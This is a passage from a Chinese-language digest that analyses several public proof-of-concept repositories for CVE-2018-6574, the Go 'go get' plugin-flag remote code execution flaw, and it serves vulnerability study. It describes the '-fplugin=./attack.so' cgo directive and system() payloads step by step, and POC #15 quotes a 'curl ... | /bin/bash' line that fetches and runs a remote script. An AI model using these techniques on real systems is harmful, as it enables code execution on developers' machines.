**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本执行 `go get` 命令拉取恶意代码

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过构造包含恶意 `// #cgo CFLAGS: -fplugin=` 指令的 Go 代码，在受害者使用 `go get` 命令拉取并构建该代码时，利用 gcc 或 clang 插件功能执行任意命令。

**有效性：**
提供的 PoC 代码是有效的。`attack.c` 文件包含一个在程序加载时执行 `system()` 函数的恶意函数，该函数会执行 `/usr/local/bin/score a96ec182-5326-4191-9570-5d5c3fe248a8` 命令。`main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建过程中加载 `attack.so` 插件，从而触发恶意代码的执行。

**投毒风险：**
经过分析，此 PoC 本身并不包含隐藏的投毒代码。`/usr/local/bin/score` 命令的功能未知，但如果该路径指向攻击者控制的服务器，可以构成数据回传或者其他恶意行为。不过单从提供的代码来看，其目的仅仅是利用漏洞触发执行任意命令，而非在代码中植入后门或其他形式的恶意代码。因此，投毒风险评估为 0%。

**利用方式：**
1.  攻击者创建一个包含恶意 `// #cgo CFLAGS: -fplugin=` 指令的 Go 包，并将该包托管在公开的代码仓库中。
2.  受害者使用存在漏洞的 Go 版本执行 `go get` 命令拉取该恶意包。
3.  `go get` 命令会自动构建该包，此时 Go 编译器会加载攻击者指定的恶意插件。
4.  恶意插件中的代码被执行，导致攻击者可以在受害者机器上执行任意命令。

**项目地址:** [Saboor-Hakimi/CVE-2018-6574](https://github.com/Saboor-Hakimi/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #6

**来源**: [CVE-2018-6574-YoussefSalama1_CVE-2018-6574.md](../2018/CVE-2018-6574-YoussefSalama1_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 受害者需要使用存在漏洞的Go版本执行 `go get` 命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Go语言的`go get`命令中，由于在编译过程中没有正确过滤`-fplugin`和`-plugin`参数，导致攻击者可以通过构造包含恶意插件的Go代码仓库，诱使受害者使用存在漏洞的Go版本执行`go get`命令时，执行任意命令。

**有效性分析：**
提供的POC代码展示了如何使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定一个插件。当使用存在漏洞的Go版本编译该代码时，`attack.so`会被加载，其中的代码会被执行，从而实现远程代码执行。

**投毒风险分析：**
提供的POC代码本身不包含明显的投毒代码，它的目的是演示漏洞利用。`attack.so`的具体内容需要进一步分析才能确定是否存在恶意代码。根据目前的信息，POC代码的投毒风险评估为0%。`main.go`本身的功能是调用`attack.so`中的函数，并打印返回值。 如果`attack.so`存在后门,执行远程命令,则存在高危风险,但此部分分析应当基于其他辅助文件,本分析只针对`main.go`进行。

**利用方式分析：**
1.  攻击者创建一个包含恶意C代码插件（如`attack.so`）的Go代码仓库。
2.  攻击者在Go源代码中使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定该插件。
3.  攻击者诱使受害者使用存在漏洞的Go版本执行`go get <attacker's repository>`命令。
4.  当Go编译受害者的代码时，会加载并执行`attack.so`中的恶意代码，从而实现远程命令执行。

**项目地址:** [YoussefSalama1/CVE-2018-6574](https://github.com/YoussefSalama1/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #7

**来源**: [CVE-2018-6574-adendarys_CVE-2018-6574.md](../2018/CVE-2018-6574-adendarys_CVE-2018-6574.md)

## CVE-2018-6574-Go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 需要目标系统使用受影响的Go版本，并执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于 `go get` 命令中，由于未正确过滤 gcc/clang 的 `-fplugin` 和 `-plugin` 参数，攻击者可以通过构造恶意的 Go 包，在构建过程中执行任意命令。提供的POC代码包含一个 C 文件 (`attack.c`)，该文件编译后生成一个动态链接库 (`attack.so`)，其中包含一个 `malicious()` 函数，该函数在动态链接库加载时自动执行，从而执行系统命令 `/usr/local/bin/score 504b8416-d89e-4980-80ff-7cd7d4605752`。Go 代码 (`main.go`) 使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令在编译时加载该动态链接库，从而触发恶意代码的执行。此POC有效，不存在明显的投毒代码，只是利用该漏洞执行预期的恶意行为。

**利用方式：**

1.  攻击者创建一个包含恶意 C 代码（如 `attack.c`）和 Go 代码（如 `main.go`）的 Go 包。
2.  `attack.c` 编译生成一个包含恶意指令的动态库。恶意指令可以是任意系统命令。
3.  Go 代码使用 `#cgo CFLAGS: -fplugin=./attack.so` 引入包含恶意指令的动态库。
4.  攻击者将该 Go 包发布到公共或私有仓库。
5.  受害者使用 `go get` 命令获取该 Go 包。
6.  在构建过程中，Go 编译器会执行 C 编译指令，加载恶意动态链接库，从而执行攻击者预设的恶意命令，导致远程命令执行。

**项目地址:** [adendarys/CVE-2018-6574](https://github.com/adendarys/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #8

**来源**: [CVE-2018-6574-antunesmpedro_CVE-2018-6574.md](../2018/CVE-2018-6574-antunesmpedro_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 使用受影响的 Go 版本执行 `go get` 命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过特制的 Go 代码仓库在目标系统上执行任意命令。当用户使用 `go get` 命令获取包含恶意代码的仓库时，Go 构建系统会执行仓库中嵌入的恶意指令。

**有效性：**

提供的 POC 代码是有效的。`exploit.c` 文件包含一个名为 `malicious` 的函数，该函数使用 `system` 函数执行一个命令，在本例中是调用 `/usr/local/bin/score e105a311-4ea5-435a-89a8-770f2cdd2189`。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，该指令指示 go 编译器将 `exploit.so` 编译为插件，并在程序运行时加载它。因为受影响的 Go 版本没有正确阻止 `-fplugin` 和 `-plugin` 参数，所以这允许执行 `exploit.c` 中的恶意代码。

**投毒风险：**

提供的代码片段本身没有明显的投毒行为。`exploit.c` 执行的命令 `/usr/local/bin/score e105a311-4ea5-435a-89a8-770f2cdd2189`  可能用于完成漏洞利用挑战或者其他目的。该命令不是一个常见的恶意行为，因此不应将其判定为投毒。
整个代码仓库的投毒风险评估为 0%，因为提供的代码段没有任何恶意行为，并且没有迹象表明作者试图隐藏恶意代码。

**利用方式：**

1.  攻击者创建一个包含恶意 `exploit.c` 和 `main.go` 文件的 Go 代码仓库。
2.  `exploit.c` 文件包含需要在目标系统上执行的恶意代码。
3.  `main.go` 文件包含 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，从而利用漏洞。
4.  攻击者诱骗目标用户使用 `go get` 命令获取恶意仓库。
5.  当用户执行 `go get` 命令时，Go 构建系统会编译并加载 `exploit.so` 插件，从而执行 `exploit.c` 中的恶意代码。
6. 目标系统受到攻击，攻击者可以在目标系统上执行任意命令。

**项目地址:** [antunesmpedro/CVE-2018-6574](https://github.com/antunesmpedro/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #9

**来源**: [CVE-2018-6574-bme2003_CVE-2018-6574.md](../2018/CVE-2018-6574-bme2003_CVE-2018-6574.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用存在漏洞的Go版本，且执行了`go get`命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行任意代码。漏洞原因是 Go 在构建源代码时，没有正确阻止 `-fplugin=` 和 `-plugin=` 参数，攻击者可以利用 gcc 或 clang 的插件功能执行恶意代码。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意代码的 Go 包，其中包含一个 `attack.c` 文件和一个 `main.go` 文件。
2.  `attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `system()` 函数执行任意命令。在给定的POC中，执行的命令是`/usr/local/bin/score a10c7b12-8910-4f65-8cd4-a6e57d90686b`。  这个命令很可能是用于提交漏洞利用结果的评分系统。
3.  `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器将 `attack.c` 编译为共享库 `attack.so`，并将其作为插件加载。
4.  当用户使用 `go get` 命令获取该恶意包时，Go 编译器会自动编译并加载插件，从而执行 `malicious()` 函数中的恶意代码。

**有效性：**

提供的POC代码有效。`main.go`文件中的`// #cgo CFLAGS: -fplugin=./attack.so`指示了利用方式，即通过`go get`拉取代码时，会编译并加载`attack.so`，从而执行预设的恶意代码。

**投毒风险：**

分析POC代码后，没有发现明显的投毒代码。`attack.c` 中的 `system()` 函数执行的命令是明确的，该POC没有包含其他隐藏的恶意行为。因此，投毒风险评估为0%。虽然执行了恶意命令，但这属于漏洞验证所需的操作，不应被视为投毒。


**项目地址:** [bme2003/CVE-2018-6574](https://github.com/bme2003/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #10

**来源**: [CVE-2018-6574-chr1sM_CVE-2018-6574.md](../2018/CVE-2018-6574-chr1sM_CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 使用受影响的Go版本，且执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞允许攻击者在`go get`命令执行过程中进行远程命令执行。漏洞原理是由于受影响的Go版本未正确过滤`-fplugin`和`-plugin`参数，攻击者可以构造包含恶意插件的Go项目，当用户使用`go get`获取并构建该项目时，恶意插件会被执行，从而实现远程命令执行。

**有效性评估：**
提供的PoC代码由两部分组成：`attack.c`和`golan.go`。`attack.c`包含一个`malicious()`函数，该函数使用`__attribute__((constructor))`修饰，表明该函数会在程序加载时自动执行。该函数的功能是执行`/usr/local/bin/score 3b9e2681-04f3-4771-b576-05baa2a7523f`命令。`golan.go` 是一个简单的 Go 程序，它调用 C 代码。通过组合这两个文件，攻击者可以创建一个恶意的 Go 包，当用户使用易受攻击的 `go get` 版本获取该包时，`attack.c` 中的恶意代码将被编译并执行，从而导致命令执行。

**投毒风险评估：**
提供的代码片段中，`attack.c` 执行了一个特定的命令`/usr/local/bin/score 3b9e2681-04f3-4771-b576-05baa2a7523f`，可以判定为漏洞验证代码，目的是为了验证漏洞是否存在。此命令本身可能与漏洞作者相关，但它不属于隐藏的、未公开的恶意行为，可以认为不存在投毒。因此投毒风险为0%。

**利用方式：**
1.  攻击者创建一个恶意的Go项目，其中包含`attack.c`和`golan.go`文件。
2.  `attack.c`包含恶意代码，例如执行任意命令。
3.  在Go项目的构建过程中，通过`-fplugin`或`-plugin`参数指定`attack.c`编译生成的插件。
4.  攻击者将恶意Go项目托管在公开的代码仓库中。
5.  诱导用户使用受影响的Go版本执行`go get`命令获取该恶意Go项目。
6.  当`go get`构建项目时，恶意插件会被加载并执行，从而实现远程命令执行。

**项目地址:** [chr1sM/CVE-2018-6574](https://github.com/chr1sM/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #11

**来源**: [CVE-2018-6574-currently-unkwn_CVE-2018-6574.md](../2018/CVE-2018-6574-currently-unkwn_CVE-2018-6574.md)

## CVE-2018-6574-Golang go get RCE

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Golang

**危害等级:** 高危，允许攻击者在受害者机器上执行任意命令

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 目标使用受影响的Golang版本，并且尝试使用`go get`命令获取包含恶意C代码的项目。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-6574漏洞允许攻击者通过`go get`命令执行远程代码。该漏洞源于Go语言在构建过程中未正确过滤`-fplugin`和`-plugin`参数，导致可以加载恶意的GCC/Clang插件。攻击者可以构造包含恶意C代码的Go项目，当受害者使用`go get`命令获取该项目时，恶意代码会被编译并执行。

**有效性：**

提供的POC代码有效。`main.go`文件通过`// #cgo CFLAGS: -fplugin=./attack.so`指令指定了要加载的插件`attack.so`。`attack.so`文件（未提供，但推测是恶意payload）会被编译并加载，从而执行恶意代码。

**投毒风险：**

代码仓库中可能存在投毒代码的风险，但从给出的`main.go`和`README.md`内容来看，直接的投毒证据并不明显。`main.go`本身只是加载一个插件，恶意代码应该位于`attack.so`中，而这个文件并没有提供。 投毒风险评估为20%是因为攻击者可以将恶意 payload 隐藏在编译后的 `attack.so` 里, 用户下载后编译并不会感知恶意代码的存在, 存在一定风险。

**利用方式：**

1.  攻击者创建一个包含恶意C代码（编译为`.so`文件）的Go项目。
2.  Go项目的源码中，使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定要加载的恶意插件。
3.  攻击者将该项目托管在公共代码仓库（如GitHub）上。
4.  受害者使用`go get <attacker_repo>`命令尝试获取该项目。
5.  Go在构建项目时，会加载攻击者指定的恶意插件，从而在受害者机器上执行任意代码。
6.  防御措施包括升级到不受影响的Go版本，或配置Go工具链以禁止加载第三方插件。

**项目地址:** [currently-unkwn/CVE-2018-6574](https://github.com/currently-unkwn/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #12

**来源**: [CVE-2018-6574-elw0od_PentesterLab.md](../2018/CVE-2018-6574-elw0od_PentesterLab.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器使用受影响的Go版本，并尝试使用`go get`获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在 `go get` 命令执行期间利用 gcc 或 clang 插件功能执行远程命令。漏洞原因是 Go 语言未阻止 `-fplugin=` 和 `-plugin=` 参数。提供的POC代码包含一个 `attack.c` 文件，该文件定义了一个名为 `malicious` 的函数，该函数在库加载时自动执行，执行 `/usr/local/bin/score 42689c33-83ff-47d2-b538-ac6931adc5d3` 命令。`main.go` 文件使用 cgo 来编译和链接 `attack.c` 文件，并通过 `#cgo CFLAGS: -fplugin=./attack.so` 指定了 gcc 插件。当执行 `go get` 获取包含此代码的仓库时，`attack.so` 会被编译并加载，导致 `malicious` 函数执行。由于 POC 代码的功能是执行预期的后门命令，因此**没有证据表明存在额外的投毒代码**。POC 的意图是展示漏洞，而不是隐藏恶意行为。

**漏洞利用方式：**
1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 的 Go 项目。
2.  攻击者将该项目托管在可公开访问的仓库中。
3.  攻击者诱使用户（开发者）使用受影响的 Go 版本执行 `go get <attacker_repo>` 命令。
4.  当 `go get` 执行时，cgo 编译并链接 `attack.c`，导致 `malicious` 函数执行，从而在目标机器上执行任意命令。


**项目地址:** [elw0od/PentesterLab](https://github.com/elw0od/PentesterLab)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #13

**来源**: [CVE-2018-6574-faiqu3_cve-2018-6574.md](../2018/CVE-2018-6574-faiqu3_cve-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器需要安装受影响的Go版本，并执行`go get`命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者通过利用 `go get` 命令在构建源代码期间执行远程命令。该漏洞源于 Go 在处理 gcc 或 clang 插件特性时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以通过创建一个包含恶意插件的 Go 包，并在该包的源码中指定使用该插件，当受害者使用 `go get` 获取并构建该包时，恶意插件将被加载和执行，从而实现远程命令执行。

**有效性：**
提供的POC代码看起来是有效的。`attack.c` 包含执行命令 `/usr/local/bin/score 3071f0cf-6174-4749-8ae3-fc6da33ec98b` 的恶意代码。`main.go` 使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，指示 go 编译器在构建时加载 `attack.so` 插件，从而执行 `attack.c` 中的恶意代码。`exploit.html` 可能是该漏洞的补充利用，通过打开一个URL，并向其postMessage，目的是为了触发漏洞利用。

**投毒风险：**
从提供的代码来看，不存在明显的投毒行为。`attack.c` 的目的明确是执行预定义的命令，这属于漏洞利用的一部分，而不是隐藏的恶意代码。`main.go` 明确指定加载该恶意插件。所以投毒风险评估为 0%。

**利用方式：**
1.  攻击者创建一个包含恶意插件的 Go 包（例如，`attack.c` 编译后的 `attack.so`）。
2.  攻击者创建一个 `main.go` 文件，其中使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令加载恶意插件。
3.  攻击者将该 Go 包托管在一个公开可访问的 Git 仓库或其他代码托管平台。
4.  攻击者诱骗受害者使用 `go get` 命令获取并构建该恶意 Go 包。
5.  当受害者执行 `go get` 命令时，Go 编译器将加载并执行恶意插件，从而执行攻击者预先设定的命令。

**项目地址:** [faiqu3/cve-2018-6574](https://github.com/faiqu3/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #14

**来源**: [CVE-2018-6574-faqihudin13_CVE-2018-6574.md](../2018/CVE-2018-6574-faqihudin13_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过控制`go get`获取的代码仓库，利用gcc/clang插件机制注入恶意代码，从而在编译时执行任意命令。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意代码的Go项目，该项目包含一个C文件 (`attack.c`) 和一个Go文件 (`main.go`)。
2.  `attack.c` 文件包含在编译时执行任意命令的代码。在这个例子中，它执行 `/usr/local/bin/score 9d8dad5f-cda0-45bd-b004-219ca9c1774c`。这个命令可能用于漏洞评分或执行恶意操作。
3.  `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 注释指示 `go` 编译器使用 `attack.c` 生成的插件。 这会强制 `go` 在构建过程中加载并执行该插件。
4.  当用户使用易受攻击的 Go 版本运行 `go get <attacker_repo>`时，`go` 命令会自动下载并构建恶意项目。
5.  由于 `-fplugin` 标志未被正确过滤，`go` 编译器将加载并执行恶意插件，从而在用户的系统上执行攻击者指定的任意命令。

**有效性评估：**

提供的PoC代码有效，它演示了如何在 `go get` 命令执行期间利用 gcc/clang 插件功能执行任意命令。

**投毒风险评估：**

在此特定仓库中，未发现明显的投毒代码。`attack.c` 中执行的命令 `/usr/local/bin/score 9d8dad5f-cda0-45bd-b004-219ca9c1774c` 本身就是漏洞验证的一部分，旨在证明可以执行任意命令。没有迹象表明作者试图隐藏其他恶意代码或功能。因此，投毒风险评估为 0%。

**总结：**

该漏洞利用了 `go get` 命令在处理 gcc/clang 插件参数时的不当输入验证。攻击者可以通过创建一个包含恶意插件的Go项目来利用此漏洞，当用户使用易受攻击的Go版本获取并构建该项目时，该插件将被加载并执行，从而导致远程命令执行。

**项目地址:** [faqihudin13/CVE-2018-6574](https://github.com/faqihudin13/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #15

**来源**: [CVE-2018-6574-frozenkp_CVE-2018-6574.md](../2018/CVE-2018-6574-frozenkp_CVE-2018-6574.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 需要目标机器安装受影响版本的Go，且执行`go get`命令

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许攻击者在受害者构建源代码时执行远程命令。漏洞原因是 `go get` 命令没有正确过滤 gcc 或 clang 插件的参数 `-fplugin=` 和 `-plugin=`。攻击者可以通过构造包含恶意插件选项的 Go 项目，诱导受害者使用 `go get` 命令获取并构建该项目，从而执行任意命令。

**有效性：**

根据漏洞描述和提供的POC代码，漏洞利用的有效性较高。POC代码通过 `#cgo` 指令设置编译选项，利用 `-fplugin` 选项加载恶意的动态链接库，从而在编译时执行预定义的命令。根据`pentesterlab.com/exercises/cve-2018-6574`中的描述，攻击者可以诱骗用户安装恶意包从而执行代码。

**投毒风险：**

该仓库中存在一定的投毒风险，但风险较低。`README.md` 中说明了漏洞利用方式，并明确表示仅用于评估目的。虽然包含了一个`curl`命令，但该命令相对简单，易于检测，攻击者可能通过其他方式进行恶意行为，例如植入更隐蔽的后门程序。该curl命令从外部源获取并执行脚本，存在被篡改的可能。综合考虑，投毒风险大约为10%。

**利用方式：**

1.  攻击者创建一个包含恶意代码的Go项目，该项目使用`#cgo`指令，在编译选项中包含`-fplugin=`或`-plugin=`，指向一个包含恶意代码的动态链接库（如 `calc.so` 或 `calc_darwin.so`）。
2.  攻击者将该项目托管在一个公开的Git仓库中。
3.  攻击者诱导受害者使用受影响版本的Go执行`go get <攻击者仓库地址>`命令。
4.  当`go get`命令构建项目时，会执行恶意动态链接库中的代码，从而实现远程命令执行。
5.  POC中，`calc_darwin.so`（或者其他平台的 `.so` 文件）被设计为执行 `curl newton.cycarrier:8002 | /bin/bash`，这意味着它会从攻击者的服务器下载并执行一个Shell脚本。

**项目地址:** [frozenkp/CVE-2018-6574](https://github.com/frozenkp/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #16

**来源**: [CVE-2018-6574-hasharmujahid_CVE-2018-6574-go-get-RCE.md](../2018/CVE-2018-6574-hasharmujahid_CVE-2018-6574-go-get-RCE.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本，并使用`go get`命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞允许攻击者在受害者的系统上执行任意命令。攻击者可以通过创建一个包含恶意代码的Go包来实现这一点。当受害者使用`go get`命令获取并构建该包时，恶意代码将被执行。漏洞利用方式如下：

1.  **利用方式:**
    *   攻击者创建一个包含恶意`attack.c`和`main.go`文件的Go包。
    *   `attack.c` 文件包含在编译时执行系统命令的代码，例如，调用 `system("/usr/local/bin/score 173b6b3c-5d6a-4237-b67f-e97ff771ae51")`。
    *   `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，指示 `go build` 使用 `attack.so` 作为 gcc 插件。这允许攻击者在构建过程中执行 `attack.c` 中的代码。
    *   攻击者将此Go包托管在公共代码仓库（例如GitHub）上。
    *   攻击者诱骗受害者使用 `go get` 命令获取并构建该恶意包。例如：`go get github.com/attacker/malicious_package`。
    *   当受害者执行 `go get` 命令时，`attack.c` 中的恶意代码将被执行，从而允许攻击者在受害者的系统上执行任意命令。

2.  **有效性:**
    *   提供的PoC代码有效。`attack.c`文件编译为共享库，并通过`main.go`中的`cgo`指令在构建时加载执行，从而实现远程命令执行。

3.  **投毒风险:**
    *   此仓库中未发现作者隐藏的投毒代码。该PoC的目的是演示漏洞利用，而不是在正常功能之外执行恶意行为。`attack.c` 中执行的 `system` 命令可以被修改为任何攻击者想要执行的命令，但目前的代码仅调用了一个看起来是用于获取分数的命令 `score`。 投毒风险为0%。

**项目地址:** [hasharmujahid/CVE-2018-6574-go-get-RCE](https://github.com/hasharmujahid/CVE-2018-6574-go-get-RCE)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #17

**来源**: [CVE-2018-6574-iNoSec2_cve-2018-6574.md](../2018/CVE-2018-6574-iNoSec2_cve-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 用户使用go get命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者在受害者使用 `go get` 命令获取恶意 Go 包时执行任意代码。该漏洞的根源在于 `go get` 命令在构建过程中没有正确过滤 gcc/clang 的插件参数，导致攻击者可以通过 `-fplugin=` 或 `-plugin=` 参数指定恶意插件，从而执行任意代码。

**有效性：**

提供的 POC 代码是有效的，它通过创建一个包含恶意 C 代码（`2018.c`）的 Go 包来实现远程代码执行。恶意 C 代码使用 `__attribute__((constructor))` 在库加载时自动执行 `malicious()` 函数，该函数执行 `/usr/local/bin/score 0634e7ff-26c1-4d5e-817e-a214be2151b7` 命令。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建时加载 `attack.so` 插件（通过编译 `2018.c` 得到）。

**投毒风险：**

该POC代码本身就是一个漏洞演示，旨在展示如何利用该漏洞执行任意命令。`2018.c` 中执行的 `/usr/local/bin/score 0634e7ff-26c1-4d5e-817e-a214be2151b7` 命令是预期的payload。该代码仓库的目的是演示漏洞，而不是为了植入后门。因此投毒风险评估为0%。

**利用方式：**

1.  **创建恶意Go包:** 攻击者创建一个包含恶意 C 代码和 Go 代码的 Go 包。恶意 C 代码编译成一个共享库（`attack.so`）。
2.  **上传恶意Go包:** 攻击者将恶意 Go 包上传到公共代码托管平台（如 GitHub）。
3.  **诱骗受害者:** 攻击者诱骗受害者使用 `go get` 命令获取恶意 Go 包。
4.  **执行恶意代码:** 当受害者使用 `go get` 命令获取恶意 Go 包时，Go 编译器会加载恶意共享库，并执行其中的恶意代码。

**缓解措施：**

*   升级 Go 版本到受影响版本之外（>= 1.8.7, >= 1.9.4, >= 1.10rc2）。
*   避免使用来自不受信任来源的 Go 包。


**项目地址:** [iNoSec2/cve-2018-6574](https://github.com/iNoSec2/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #18

**来源**: [CVE-2018-6574-jahwni_CVE-2018-6574.md](../2018/CVE-2018-6574-jahwni_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本执行 `go get` 命令来获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程代码。攻击者可以创建一个包含恶意代码的Go包，并将该包托管在公开的存储库中。当受害者使用 `go get` 命令获取该包时，恶意代码将在构建过程中执行。利用方式为在包中利用 gcc 或 clang 的插件功能（`-fplugin=` 或 `-plugin=` 参数），在编译时执行任意命令。

提供的PoC代码包含两个文件：`attack.c` 和 `main.go`。
